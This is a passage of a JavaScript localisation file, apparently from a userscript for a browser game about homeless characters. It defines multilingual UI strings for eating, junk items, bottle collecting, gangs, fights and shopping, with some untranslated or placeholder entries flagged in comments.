    TxtEatError[4] = 'There was an error with the eating, you still have %s per mills';
    TxtEatError[5] = 'There was an error with the eating, you still have %s per mills';
    TxtEatError[6] = 'С едой вышла ошибка, у тебя все еще %s промилле!';
    TxtEatError[7] = 'There was an error with the eating, you still have %s per mills';
var TxtNotMuchToEat = new Array();
    TxtNotMuchToEat[0] = 'Die Vorräte an %s und/oder %s\ngehen zur Neige. Bitte zuerst nachkaufen!';
    TxtNotMuchToEat[1] = 'Your supply of %s and/or %s is running low.\nPlease buy some of them first!';
    TxtNotMuchToEat[2] = 'Your supply of %s and/or %s is running low.\nPlease buy some of them first!';
    TxtNotMuchToEat[3] = 'Your supply of %s and/or %s is running low.\nPlease buy some of them first!';
    TxtNotMuchToEat[4] = 'Your supply of %s and/or %s is running low.\nPlease buy some of them first!';
    TxtNotMuchToEat[5] = 'Your supply of %s and/or %s is running low.\nPlease buy some of them first!';
    TxtNotMuchToEat[6] = 'Запасы %s и/или %s\nзаканчиваются. Сначала докупите!';
    TxtNotMuchToEat[7] = 'Your supply of %s and/or %s is running low.\nPlease buy some of them first!';
var TxtNoNeedToEat = new Array();
    TxtNoNeedToEat[0] = '0,75 Promille oder weniger beeinträchtigen die Kampfwerte nicht,\nDu musst nichts mehr essen!';
    TxtNoNeedToEat[1] = "0.75 per mills or less do not reduce the figthing values,\nyou don't need to eat more!";
    TxtNoNeedToEat[2] = "0.75 per mills or less do not reduce the figthing values,\nyou don't need to eat more!";
    TxtNoNeedToEat[3] = "0.75 per mills or less do not reduce the figthing values,\nyou don't need to eat more!";
    TxtNoNeedToEat[4] = "0.75 per mills or less do not reduce the figthing values,\nyou don't need to eat more!";
    TxtNoNeedToEat[5] = "0.75 per mills or less do not reduce the figthing values,\nyou don't need to eat more!";
    TxtNoNeedToEat[6] = "0,75 или меньше промилле на силу не влияют, \nтебе не нужно больше есть!";
    TxtNoNeedToEat[7] = "0.75 per mills or less do not reduce the figthing values,\nyou don't need to eat more!";
var TxtNotEnoughToEat = new Array();
    TxtNotEnoughToEat[0] = 'Es ist nicht genügend zu essen da !!';
    TxtNotEnoughToEat[1] = "You don't have enough to eat !!";
    TxtNotEnoughToEat[2] = "You don't have enough to eat !!";
    TxtNotEnoughToEat[3] = "You don't have enough to eat !!";
    TxtNotEnoughToEat[4] = "No tienes suficiente para comer !!";
    TxtNotEnoughToEat[5] = "You don't have enough to eat !!";
    TxtNotEnoughToEat[6] = "Недостаточно еды!";
    TxtNotEnoughToEat[7] = "You don't have enough to eat !!";
var TxtNoJunkLeft = new Array();
    TxtNoJunkLeft[0] = "Vom benutzbaren Plunder '%s' ist leider nichts mehr übrig,\nDu musst ihn wieder sammeln. Er wird er aus der Direktleiste entfernt.";
    TxtNoJunkLeft[1] = "There's nothing left from the useable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft[2] = "There's nothing left from the useable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft[3] = "There's nothing left from the useable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft[4] = "There's nothing left from the useable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft[5] = "There's nothing left from the useable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft[6] = "‘%s’, который можно использовать, закончился, \nты должен собирать бутылки. Барахло будет удалено из панели.";
    TxtNoJunkLeft[7] = "There's nothing left from the useable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
var TxtNoJunkLeft2 = new Array();
    TxtNoJunkLeft2[0] = "Vom anlegbaren Plunder '%s' ist leider nichts mehr übrig,\nDu musst ihn wieder sammeln. Er wird er aus der Direktleiste entfernt.";
    TxtNoJunkLeft2[1] = "There's nothing left from the wearable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft2[2] = "There's nothing left from the wearable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft2[3] = "There's nothing left from the wearable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft2[4] = "There's nothing left from the wearable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft2[5] = "There's nothing left from the wearable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
    TxtNoJunkLeft2[6] = "‘%s’ закончилось, \nты должен собирать бутылки. Барахло будет удалено из панели.";
    TxtNoJunkLeft2[7] = "There's nothing left from the wearable junk '%s'.\nYou have to collect it again. It will be removed from the direct access list";
var TxtEquip = new Array();
    TxtEquip[0] = 'Anlegen';
    TxtEquip[1] = 'Equip';
    TxtEquip[2] = 'Załóż';
    TxtEquip[3] = 'Équiper';
    TxtEquip[4] = 'Encarar';
    TxtEquip[5] = 'Ativar';
    TxtEquip[6] = 'приложить';
    TxtEquip[7] = 'Equip';
var TxtUse = new Array();
    TxtUse[0] = 'Benutzen';
    TxtUse[1] = 'Use';
    TxtUse[2] = 'Użyj';
    TxtUse[3] = 'Utiliser';
    TxtUse[4] = 'Utilizar';
    TxtUse[5] = 'Usar';
    TxtUse[6] = 'использовать';
    TxtUse[7] = 'Use';
var TxtNoSkill = new Array();
    TxtNoSkill[0] = "Keine Weiterbildung";
    TxtNoSkill[1] = "No development";
    TxtNoSkill[2] = "Nie szkolenie";
    TxtNoSkill[3] = "Aucune formation";
    TxtNoSkill[4] = "Ningún cursillo";
    TxtNoSkill[5] = "No development";   // !!!!
    TxtNoSkill[6] = "обучения нет";
    TxtNoSkill[7] = "No development";
var TxtNoJunk = new Array();
    TxtNoJunk[0] = "Kein Plunder angelegt";
    TxtNoJunk[1] = "No junk equipped";
    TxtNoJunk[2] = "Nie masz rupieci";
    TxtNoJunk[3] = "Aucune babiole sélectionné";
    TxtNoJunk[4] = "Ningún cachivache encara";
    TxtNoJunk[5] = "No junk equipped";   // !!!!
    TxtNoJunk[6] = "барахло не приложено";
    TxtNoJunk[7] = "No junk equipped";
var TxtUseJunk = new Array();
    TxtUseJunk[0] = '%s: %s (noch %d Stück übrig)';
    TxtUseJunk[1] = '%s: %s (still %d pieces remaining)';
    TxtUseJunk[2] = '%s: %s (still %d pieces remaining)';
    TxtUseJunk[3] = '%s: %s (still %d pieces remaining)';
    TxtUseJunk[4] = '%s: %s (still %d pieces remaining)';
    TxtUseJunk[5] = '%s: %s (still %d pieces remaining)';
    TxtUseJunk[6] = '%s: %s (осталось еще %d штук)';
    TxtUseJunk[7] = '%s: %s (still %d pieces remaining)';
var TxtEquipThisJunk = new Array();
    TxtEquipThisJunk[0] = 'Dieser Plunder wird angelegt';
    TxtEquipThisJunk[1] = 'This junk can be equipped';
    TxtEquipThisJunk[2] = 'This junk can be equipped';
    TxtEquipThisJunk[3] = 'This junk can be equipped';
    TxtEquipThisJunk[4] = 'This junk can be equipped';
    TxtEquipThisJunk[5] = 'This junk can be equipped';
    TxtEquipThisJunk[6] = 'это барахло будет приложено';
    TxtEquipThisJunk[7] = 'This junk can be equipped';
var TxtUseThisJunk = new Array();
    TxtUseThisJunk[0] = 'Dieser Plunder wird benutzt';
    TxtUseThisJunk[1] = 'This junk can be used';
    TxtUseThisJunk[2] = 'This junk can be used';
    TxtUseThisJunk[3] = 'This junk can be used';
    TxtUseThisJunk[4] = 'This junk can be used';
    TxtUseThisJunk[5] = 'This junk can be used';
    TxtUseThisJunk[6] = 'это барахло будет использовано';
    TxtUseThisJunk[7] = 'This junk can be used';
var TxtReallyUseJunk = new Array();
    TxtReallyUseJunk[0] = "Soll der Plunder '%s' wirklich benutzt werden?\n\nHinweis: Durch die Benutzung wird er sofort verbraucht. Du hast\nderzeit noch %d Stück.";
    TxtReallyUseJunk[1] = "Do you really want to use the junk '%s'?\n\nNote: Using it will consume it. At the moment\nyou still have %d pieces.";
    TxtReallyUseJunk[2] = "Do you really want to use the junk '%s'?\n\nNote: Using it will consume it. At the moment\nyou still have %d pieces.";
    TxtReallyUseJunk[3] = "Do you really want to use the junk '%s'?\n\nNote: Using it will consume it. At the moment\nyou still have %d pieces.";
    TxtReallyUseJunk[4] = "Do you really want to use the junk '%s'?\n\nNote: Using it will consume it. At the moment\nyou still have %d pieces.";
    TxtReallyUseJunk[5] = "Do you really want to use the junk '%s'?\n\nNote: Using it will consume it. At the moment\nyou still have %d pieces.";
    TxtReallyUseJunk[6] = "Хочешь использовать ‘%s’ барахло? \n\nвнимание: после использования барахло исчезает. У тебя\nсейчас еще %d штук.";
    TxtReallyUseJunk[7] = "Do you really want to use the junk '%s'?\n\nNote: Using it will consume it. At the moment\nyou still have %d pieces.";
var TxtJunkUsed = new Array();
    TxtJunkUsed[0] = '%s wurde erfolgreich benutzt.';
    TxtJunkUsed[1] = '%s was successfully used.';
    TxtJunkUsed[2] = '%s was successfully used.';
    TxtJunkUsed[3] = '%s was successfully used.';
    TxtJunkUsed[4] = '%s was successfully used.';
    TxtJunkUsed[5] = '%s was successfully used.';
    TxtJunkUsed[6] = '%s было успешно использовано.';
    TxtJunkUsed[7] = '%s was successfully used.';
var TxtJunkNoSucc = new Array();
    TxtJunkNoSucc[0] = "%s konnte nicht benutzt werden.";
    TxtJunkNoSucc[1] = "%s could not successfully be used.";
var TxtJunkSucc = new Array();
    TxtJunkSucc[0] = "%s wurde %dmal erfolgreich benutzt.";
    TxtJunkSucc[1] = "%s was successfully used %d times.";
var TxtPlayerName = new Array();
    TxtPlayerName[0] = "Auf welchen Spieler soll der Plunder angewendet werden ?\n\nSpielername: ";
var TxtNoProfAbility = new Array();
    TxtNoProfAbility[0] = "Du profitierst nicht von der Bandenfähigkeit";
    TxtNoProfAbility[1] = "You don't profit from the gang ability";
    TxtNoProfAbility[2] = "Nie zyskujesz na talentach bandy";
    TxtNoProfAbility[3] = "You don't profit from the gang ability";
    TxtNoProfAbility[4] = "You don't profit from the gang ability";
    TxtNoProfAbility[5] = "You don't profit from the gang ability";
    TxtNoProfAbility[6] = "Способности банды тебе не приносят пользу";
    TxtNoProfAbility[7] = "You don't benefit from the gang ability";
var TxtAlertNoGang = new Array();
    TxtAlertNoGang[0] = "ACHTUNG!! Du bist nicht mehr in einer Bande !!";
    TxtAlertNoGang[1] = "ATTENTION !! You are no longer member of a gang !!";
    TxtAlertNoGang[2] = "ATTENTION !! You are no longer member of a gang !!";
    TxtAlertNoGang[3] = "ATTENTION !! You are no longer member of a gang !!";
    TxtAlertNoGang[4] = "ATTENTION !! You are no longer member of a gang !!";
    TxtAlertNoGang[5] = "ATTENTION !! You are no longer member of a gang !!";
    TxtAlertNoGang[6] = "ВНИМАНИЕ!! Ты больше не в банде !!";
    TxtAlertNoGang[7] = "ATTENTION !! You are no longer member of a gang !!";
var TxtLogout = new Array();
    TxtLogout[0] = "Ausloggen ?";
    TxtLogout[1] = "Logout ?";
    TxtLogout[2] = "Wyloguj ?";
    TxtLogout[3] = "Déconnexion ?";
    TxtLogout[4] = "Salir ?";
    TxtLogout[5] = "Logout ?";
    TxtLogout[6] = "Выйти ?";
    TxtLogout[7] = "Logout ?";
var TxtLogoutWarn1 = new Array();
    TxtLogoutWarn1[0] = "Achtung !! Du bist noch betrunken !!";
    TxtLogoutWarn1[1] = "Warning !! You are still drunk !!";
    TxtLogoutWarn1[2] = "Warning !! You are still drunk !!";
    TxtLogoutWarn1[3] = "Warning !! You are still drunk !!";
    TxtLogoutWarn1[4] = "Warning !! You are still drunk !!";
    TxtLogoutWarn1[5] = "Warning !! You are still drunk !!";
    TxtLogoutWarn1[6] = "Внимание!! Ты еще пьяный !!";
    TxtLogoutWarn1[7] = "Warning !! You are still drunk !!";
var TxtLogoutWarn2 = new Array();
    TxtLogoutWarn2[0] = "Achtung !! Du hast nicht Deine volle Kampfstärke !!";
    TxtLogoutWarn2[1] = "Warning !! You do not have your full possible fighting power !!";
    TxtLogoutWarn2[2] = "Warning !! You do not have your full possible fighting power !!";
    TxtLogoutWarn2[3] = "Warning !! You do not have your full possible fighting power !!";
    TxtLogoutWarn2[4] = "Warning !! You do not have your full possible fighting power !!";
    TxtLogoutWarn2[5] = "Warning !! You do not have your full possible fighting power !!";
    TxtLogoutWarn2[6] = "Внимание !! У тебя еще не полная сила !!";
    TxtLogoutWarn2[7] = "Warning !! You do not have your full possible fighting power !!";
var TxtCart = new Array();
    TxtCart[0] = "Einkaufswagen ausleeren";
    TxtCart[1] = "Empty cart";
    TxtCart[2] = "Opróżnij wózek na zakupy";
    TxtCart[3] = "Vider ton caddie";
    TxtCart[4] = "Vaciar el carro de la compra";
    TxtCart[5] = "Esvaziar carrinho de compras";
    TxtCart[6] = "Разгрузить тележку";
    TxtCart[7] = "Empty cart";
var TxtCart2 = new Array();
    TxtCart2[0] = "Flaschensammeln starten";
    TxtCart2[1] = "start collecting bottles";
    TxtCart2[2] = "start collecting bottles";
    TxtCart2[3] = "start collecting bottles";
    TxtCart2[4] = "start collecting bottles";
    TxtCart2[5] = "start collecting bottles";
    TxtCart2[6] = "начать собирать бутылки";
    TxtCart2[7] = "start collecting bottles";
var TxtCart3 = new Array();
    TxtCart3[0] = "Flaschen werden gesammelt";
    TxtCart3[1] = "collecting bottles";
    TxtCart3[2] = "collecting bottles";
    TxtCart3[3] = "collecting bottles";
    TxtCart3[4] = "collecting bottles";
    TxtCart3[5] = "collecting bottles";
    TxtCart3[6] = "бутылки собираются";
    TxtCart3[7] = "collecting bottles";
var TxtCollFinish = new Array();
    TxtCollFinish[0] = "Das Flaschensammeln wurde beendet";
    TxtCollFinish[1] = "The collecting of bottles was finished";
    TxtCollFinish[2] = "The collecting of bottles was finished";
    TxtCollFinish[3] = "The collecting of bottles was finished";
    TxtCollFinish[4] = "The collecting of bottles was finished";
    TxtCollFinish[5] = "The collecting of bottles was finished";
    TxtCollFinish[6] = "бутылки собраны";
    TxtCollFinish[7] = "The collecting of bottles was finished";
var TxtCrime = new Array();
    TxtCrime[0] = "Du planst ein Verbrechen!";
    TxtCrime[1] = "You're planning a crime!";
    TxtCrime[2] = "You're planning a crime!";
    TxtCrime[3] = "You're planning a crime!";
    TxtCrime[4] = "You're planning a crime!";
    TxtCrime[5] = "You're planning a crime!";
    TxtCrime[6] = "Ты задумал преступление!";
    TxtCrime[7] = "You're planning a crime!";
var TxtCrimePro = new Array();
    TxtCrimePro[0] = " ACHTUNG !! Betrunken wird das Verbrechen nicht gelingen!!";
    TxtCrimePro[1] = " Attention !! You are drunk and you will have no success with the crime!!";
    TxtCrimePro[2] = " Attention !! You are drunk and you will have no success with the crime!!";
    TxtCrimePro[3] = " Attention !! You are drunk and you will have no success with the crime!!";
    TxtCrimePro[4] = " Attention !! You are drunk and you will have no success with the crime!!";
    TxtCrimePro[5] = " Attention !! You are drunk and you will have no success with the crime!!";
    TxtCrimePro[6] = " ВНИМАНИЕ !! Если ты пьян, преступление не удастся!!";
    TxtCrimePro[7] = " Attention !! You are drunk and you will have no success with the crime!!";
var TxtFight = new Array();
    TxtFight[0] = "Du hast einen Kampf gestartet gegen %s!";
    TxtFight[1] = "You started a fight against %s!";
    TxtFight[2] = "You started a fight against %s!";
    TxtFight[3] = "You started a fight against %s!";
    TxtFight[4] = "You started a fight against %s!";
    TxtFight[5] = "You started a fight against %s!";
    TxtFight[6] = "Ты начал бой против %s!";
    TxtFight[7] = "You started a fight against %s!";
var TxtEmptied = new Array();
    TxtEmptied[0] = "Einkaufswagen ausgeleert. Du hast %d Flaschen gesammelt.";
    TxtEmptied[1] = "Cart emptied! You found %d bottles.";
    TxtEmptied[2] = "Cart emptied! You found %d bottles.";
    TxtEmptied[3] = "Cart emptied! You found %d bottles.";
    TxtEmptied[4] = "Cart emptied! You found %d bottles.";
    TxtEmptied[5] = "Cart emptied! You found %d bottles.";
    TxtEmptied[6] = "Корзина разгружена. Ты собрал %d бутылок.";
    TxtEmptied[7] = "Cart emptied! You found %d bottles.";
var TxtDaily = new Array();
    TxtDaily[0] = "Tägliche Aufgabe";
    TxtDaily[1] = "Daily tasks";
    TxtDaily[2] = "Zadanie dnia";
    TxtDaily[3] = "Tâche journalière";
    TxtDaily[4] = "Tarea diaria";
    TxtDaily[5] = "Tarefa diária";
    TxtDaily[6] = "Сегодняшнее задание";
    TxtDaily[7] = "Daily tasks";
var TxtCards = new Array();
    TxtCards[0] = "Deine Sammelkarten: ";
    TxtCards[1] = "Your Credits: ";
    TxtCards[2] = "Twoje znaczki: ";
    TxtCards[3] = "Tes jetons: ";
    TxtCards[4] = "Tus fichas: ";
    TxtCards[5] = "Seu álbum de comprovantes: ";
    TxtCards[6] = "Твои карточки: ";
    TxtCards[7] = "Your Credits: ";
var TxtEnd = new Array();
    TxtEnd[0] = ', Ende: ';
    TxtEnd[1] = ', End: ';
    TxtEnd[2] = ', Zakończ: ';
    TxtEnd[3] = ', Fin: ';
    TxtEnd[4] = ', End: ';
    TxtEnd[5] = ', End: ';
    TxtEnd[6] = ', Конец: ';
    TxtEnd[7] = ', End: ';
var TxtInfo = new Array();
    TxtInfo[0] = 'Info ist an --> Ausschalten';
    TxtInfo[1] = 'Info is on --> Switch off';
    TxtInfo[2] = 'Info is on --> Switch off';
    TxtInfo[3] = 'Info is on --> Switch off';
    TxtInfo[4] = 'Info is on --> Switch off';
    TxtInfo[5] = 'Info is on --> Switch off';
    TxtInfo[6] = 'Информация включена —> Выключить';
    TxtInfo[7] = 'Info is on --> Switch off';
var TxtNoInfo = new Array();
    TxtNoInfo[0] = 'Info ist aus --> Einschalten';
    TxtNoInfo[1] = 'Info is off --> Switch on';
    TxtNoInfo[2] = 'Info is off --> Switch on';
    TxtNoInfo[3] = 'Info is off --> Switch on';
    TxtNoInfo[4] = 'Info is off --> Switch on';
    TxtNoInfo[5] = 'Info is off --> Switch on';
    TxtNoInfo[6] = 'Информация выключена —> Включить';
    TxtNoInfo[7] = 'Info is off --> Switch on';
var TxtNoteOnPage = new Array();
    TxtNoteOnPage[0] = 'Zum gemerkten SB-Eintrag auf Seite %d gehen';
    TxtNoteOnPage[1] = 'Go to the pinned shoutbox entry on page %d';
    TxtNoteOnPage[2] = 'Go to the pinned shoutbox entry on page %d';
    TxtNoteOnPage[3] = 'Go to the pinned shoutbox entry on page %d';
    TxtNoteOnPage[4] = 'Go to the pinned shoutbox entry on page %d';
    TxtNoteOnPage[5] = 'Go to the pinned shoutbox entry on page %d';
    TxtNoteOnPage[6] = 'Для сохраненной шаутбокс-записи перейти на %d страницу.';
    TxtNoteOnPage[7] = 'Go to the pinned shoutbox entry on page %d';
var TxtOwnGang = new Array();
    TxtOwnGang[0] = 'Du greifst ein Mitglied Deiner eigenen Bande an !!';
    TxtOwnGang[1] = 'You attack a member of your own gang !!';
    TxtOwnGang[2] = 'You attack a member of your own gang !!';
    TxtOwnGang[3] = 'You attack a member of your own gang !!';
    TxtOwnGang[4] = 'You attack a member of your own gang !!';
    TxtOwnGang[5] = 'You attack a member of your own gang !!';
    TxtOwnGang[6] = 'Ты атакуешь игрока из твоей банды!!';
    TxtOwnGang[7] = 'You attack a member of your own gang !!';
var TxtAlliedGang = new Array();
    TxtAlliedGang[0] = 'Du greifst ein Mitglied einer befreundeten Bande an !!';
    TxtAlliedGang[1] = 'You attack a member of an allied gang !!';
    TxtAlliedGang[2] = 'You attack a member of an allied gang !!';
    TxtAlliedGang[3] = 'You attack a member of an allied gang !!';
    TxtAlliedGang[4] = 'You attack a member of an allied gang !!';
    TxtAlliedGang[5] = 'You attack a member of an allied gang !!';
    TxtAlliedGang[6] = 'Ты атакуешь игрока который дружит с твоей бандой!!';
    TxtAlliedGang[7] = 'You attack a member of an allied gang !!';
var TxtMultiPlunder = new Array();
    TxtMultiPlunder[0] = ' Wie oft soll der Plunder benutzt werden ?';
    TxtMultiPlunder[1] = ' How many times do you want to use the plunder ?';
var TxtMultiPlunder1 = new Array();
    TxtMultiPlunder1[0] = 'Dieser Plunder ist %d mal vorhanden.';
    TxtMultiPlunder1[1] = 'You possess this plunder %d times.';
var TxtMultiPlunder2 = new Array();
    TxtMultiPlunder2[0] = 'Bitte nur eine Zahl (höchstens %d) eingeben.';
    TxtMultiPlunder2[1] = 'Please enter a number (at most %d).';
var TxtMultiPlunder3 = new Array();
    TxtMultiPlunder3[0] = 'So oft ist der Plunder nicht vorhanden (%d).';
    TxtMultiPlunder3[1] = 'You do not possess this plunder so many times (%d).';
var TxtWiWut = new Array();
    TxtWiWut[0] = new Array('Wutentfachung', 'Rage', 'Wzbudzanie złości', 'Rage',
                            'Enfurecimiento', 'Enraivecimento', 'Разжигание ярости', 'Rage');
    TxtWiWut[1] = new Array('Wirtschaftswunder', 'Economic wonder', 'Cud gospodarczy', 'Miracle économique',
                            'Milagro económico', 'Milagre econômico', 'Экономическое чудо', 'Economic wonder');

// Ingame Texte
var TxtEstimated = new Array();
    TxtEstimated[0] = "Voraussichtlich";
    TxtEstimated[1] = "estimated";
    TxtEstimated[2] = "Przewidzianych";
    TxtEstimated[3] = "sont prévus";
    TxtEstimated[4] = "Probablemente";
    TxtEstimated[5] = "Provavelmente";
    TxtEstimated[6] = "Приблизительно";
    TxtEstimated[7] = "Estimated";

var TxtTrikot = new Array();
    TxtTrikot[0] = "Trikot";
    TxtTrikot[1] = "Jersey";
    TxtTrikot[2] = "Koszulka";
    TxtTrikot[3] = "Jersey";
    TxtTrikot[4] = "Jersey";
    TxtTrikot[5] = "Camisa";
    TxtTrikot[6] = "Jersey";   // !!!!
    TxtTrikot[7] = "Jersey";   // !!!!

var TxtRunAttack = new Array();
    TxtRunAttack[0] = "uft bereits auf";
    TxtRunAttack[1] = "Already accumulated attacks";
    TxtRunAttack[2] = "Atak ju";
    TxtRunAttack[3] = "Attaque en cours";
    TxtRunAttack[4] = "El ataque ya ha";
    TxtRunAttack[5] = "O ataque j";
    TxtRunAttack[6] = "Атака уже пошла";
    TxtRunAttack[7] = "Attack is underway";

var TxtNoGangFights = new Array();
    TxtNoGangFights[0] = "Keine laufenden";
    TxtNoGangFights[1] = "No current";
    TxtNoGangFights[2] = "Nie ma toczących sie walk";
    TxtNoGangFights[3] = "Aucun combat en cours";
    TxtNoGangFights[4] = "No hay luchas de bandas en curso";
    TxtNoGangFights[5] = "nenhuma luta acontecendo";
    TxtNoGangFights[6] = "Действующих разборок нет";
    TxtNoGangFights[7] = "No current";

var TxtBoost = new Array();
    TxtBoost[0] = 'Stärkung:';
    TxtBoost[1] = 'Strenth';
    TxtBoost[2] = 'Wzmocnienie:';
    TxtBoost[3] = 'Renforcement :';
    TxtBoost[4] = 'Fortalecimiento:';
    TxtBoost[5] = 'Força:';
    TxtBoost[6] = 'Подкрепление:';
    TxtBoost[7] = 'Strength';
var TxtInjury = new Array();
    TxtInjury[0] = 'Verletzung:';
    TxtInjury[1] = 'Strenth';
    TxtInjury[2] = 'Wzmocnienie:';
    TxtInjury[3] = 'Renforcement :';
    TxtInjury[4] = 'Herida:';
    TxtInjury[5] = 'Força:';
    TxtInjury[6] = 'Подкрепление:';
    TxtInjury[7] = 'Strength';
var TxtATTBoost = new Array();
    TxtATTBoost[0] = 'ATT: ';
    TxtATTBoost[1] = 'ATT: ';
    TxtATTBoost[2] = 'ATT: ';
    TxtATTBoost[3] = 'ATT: ';
    TxtATTBoost[4] = 'ATT: ';
    TxtATTBoost[5] = 'ATT: ';
    TxtATTBoost[6] = 'Aтака: ';
    TxtATTBoost[7] = 'ATT: ';
var TxtDEFBoost = new Array();
    TxtDEFBoost[0] = 'DEF: ';
    TxtDEFBoost[1] = 'DEF: ';
    TxtDEFBoost[2] = 'DEF: ';
    TxtDEFBoost[3] = 'DEF: ';
    TxtDEFBoost[4] = 'DEF: ';
    TxtDEFBoost[5] = 'DEF: ';
    TxtDEFBoost[6] = 'DEF: ';
    TxtDEFBoost[7] = 'DEF: ';
var TxtBuyPet = new Array();
    TxtBuyPet[0] = 'Neues Haustier kaufen';
    TxtBuyPet[1] = 'Buy New Pet';
    TxtBuyPet[2] = 'Kup nowego zwierzaka';
    TxtBuyPet[3] = 'Acheter un nouvel animal';
    TxtBuyPet[4] = 'Comprar una mascota nueva';
    TxtBuyPet[5] = 'Comprar novo animal de estimação';
    TxtBuyPet[6] = 'Купить нового питомца';
    TxtBuyPet[7] = 'Buy new pet';
var TxtBuyWeapon = new Array();
    TxtBuyWeapon[0] = 'Zum Waffenladen';
    TxtBuyWeapon[1] = 'To Weapon store';
    TxtBuyWeapon[2] = 'do sklepu z bronią';
    TxtBuyWeapon[3] = "Au magasin d'armes";
    TxtBuyWeapon[4] = 'Ir a la tienda de armas';
    TxtBuyWeapon[5] = 'Para o depósito de armas';
    TxtBuyWeapon[6] = 'К оружейному магазину';
    TxtBuyWeapon[7] = 'Go to weapon shop';
var TxtBought = new Array();
    TxtBought[0] = 'Gekauft';
    TxtBought[1] = 'Bought';
    TxtBought[2] = 'Kupiony';
    TxtBought[3] = 'Utiliser';
    TxtBought[4] = 'Comprado';
    TxtBought[5] = 'Comprado';
    TxtBought[6] = 'Куплено';
    TxtBought[7] = 'Bought';
var TxtDefBought = new Array();
    TxtDefBought[0] = 'Abbrechen';
    TxtDefBought[1] = 'Cancelled';
    TxtDefBought[2] = 'Anuluj';
    TxtDefBought[3] = 'Annuler';
    TxtDefBought[4] = 'Interrumpir';
    TxtDefBought[5] = 'Cancelar';
    TxtDefBought[6] = 'Отменить';
    TxtDefBought[7] = 'Cancel';
var TxtSelected = new Array();
    TxtSelected[0] = 'Ausgewählt';
    TxtSelected[1] = 'Selected';
    TxtSelected[2] = 'Wybrany';
    TxtSelected[3] = 'Sélectionné';
    TxtSelected[4] = 'Escogido';
    TxtSelected[5] = 'Selecionado';
    TxtSelected[6] = 'Выбрано';
    TxtSelected[7] = 'Selected';
var TxtPiece = new Array();
    TxtPiece[0] = ' Stück</td>';
    TxtPiece[1] = ' Piece</td>';
    TxtPiece[2] = ' Sztuk</td>';
    TxtPiece[3] = ' Unités</td>';
    TxtPiece[4] = ' pieza</td>';
    TxtPiece[5] = ' Unidade(s)</td>';
    TxtPiece[6] = ' Штука</td>';
    TxtPiece[7] = ' Piece</td>';
var TxtArmoury = new Array();
    TxtArmoury[0] = 'Waffenkammer';
    TxtArmoury[1] = '<td>Armoury';
    TxtArmoury[2] = 'Magazyn broni';
    TxtArmoury[3] = "Salle d'armes";
    TxtArmoury[4] = 'Armería';
    TxtArmoury[5] = '<td>Depósito de armas';
    TxtArmoury[6] = '<td>Арсенал';
    TxtArmoury[7] = '<td>Armoury';
var TxtHouse = new Array();
    TxtHouse[0] = 'Bandenhaus';
    TxtHouse[1] = 'Safe House';
    TxtHouse[2] = 'Siedziba bandy';
    TxtHouse[3] = 'Quartier général de la bande';
    TxtHouse[4] = 'Casa de la banda';
    TxtHouse[5] = 'Sede da gangue';
    TxtHouse[6] = 'Дом банды';
    TxtHouse[7] = 'Gang lair';
var TxtOccupied = new Array();
    TxtOccupied[0] = 'Bewohnt';
    TxtOccupied[1] = 'Occupied';
    TxtOccupied[2] = 'Zamieszkany';
    TxtOccupied[3] = 'Habité';
    TxtOccupied[4] = 'Habitado';
    TxtOccupied[5] = 'Habitado';
    TxtOccupied[6] = 'Ты живешь здесь';
    TxtOccupied[7] = 'Occupied';
var TxtMoveIn = new Array();
    TxtMoveIn[0] = 'Einziehen';
    TxtMoveIn[1] = 'Go to';
    TxtMoveIn[2] = 'Idż';
    TxtMoveIn[3] = 'Emménager';
    TxtMoveIn[4] = 'Mudarme';
    TxtMoveIn[5] = 'Mudar';
    TxtMoveIn[6] = 'вселиться';
    TxtMoveIn[7] = 'Move in';
var TxtBeer1 = new Array();
    TxtBeer1[0] = 'Flaschen Bier';
    TxtBeer1[1] = 'Bottle Beer';
    TxtBeer1[2] = 'Puszka Piwa';
    TxtBeer1[3] = 'Tickets Brique de vin';
    TxtBeer1[4] = 'chatarra Calimocho';
    TxtBeer1[5] = 'Garrafas Cerveja';
    TxtBeer1[6] = 'Бутылки Пиво';
    TxtBeer1[7] = 'Jumble Lager';
var TxtBeer2 = new Array();
    TxtBeer2[0] = 'Flaschen Limo';
    TxtBeer2[1] = 'Bottle Beer';
    TxtBeer2[2] = 'Puszek Piwa';
    TxtBeer2[3] = 'Tickets Brique de vin';
    TxtBeer2[4] = 'chatarra Calimocho';
    TxtBeer2[5] = 'Garrafas Cerveja';
    TxtBeer2[6] = 'Бутылки Пиво';
    TxtBeer2[7] = 'Jumble Lager';
var TxtAbility1 = new Array();
    TxtAbility1[0] = 'Eine F&auml;higkeit wurde bereits aktiviert';
    TxtAbility1[1] = 'An ability has already been activated';
    TxtAbility1[2] = ' zdolności jest już rozpoczęte';
    TxtAbility1[3] = 'An ability has already been activated';    // <--- dieser Text muss noch korrigiert werden
    TxtAbility1[4] = 'Te hemos activado una habilidad';
    TxtAbility1[5] = 'An ability has already been activated';   // !!!!
    TxtAbility1[6] = 'Одна способность уже активирована';
    TxtAbility1[7] = 'One ability is already active';
var TxtAbility2 = new Array();
    TxtAbility2[0] = ' und l&auml;uft noch bis ';
    TxtAbility2[1] = ' and runs to  ';
    TxtAbility2[2] = ' jeszcze do ';
    TxtAbility2[3] = ' and runs to  ';    // <--- dieser Text muss noch korrigiert werden
    TxtAbility2[4] = ' y esta dura hasta ';
    TxtAbility2[5] = ' and runs to  ';   // !!!!
    TxtAbility2[6] = ' и действует до ';
    TxtAbility2[7] = ' until  ';
var TxtNoGangAbility = new Array();
    TxtNoGangAbility[0] = "Du profitierst nicht";
    TxtNoGangAbility[1] = "You don't profit";
    TxtNoGangAbility[2] = "Nie zyskujesz na talentach";
    TxtNoGangAbility[3] = "Vous n'en profitez pas";
    TxtNoGangAbility[4] = "You don't profit";    // <--- dieser Text muss noch korrigiert werden
    TxtNoGangAbility[5] = "You don't profit";   // !!!!
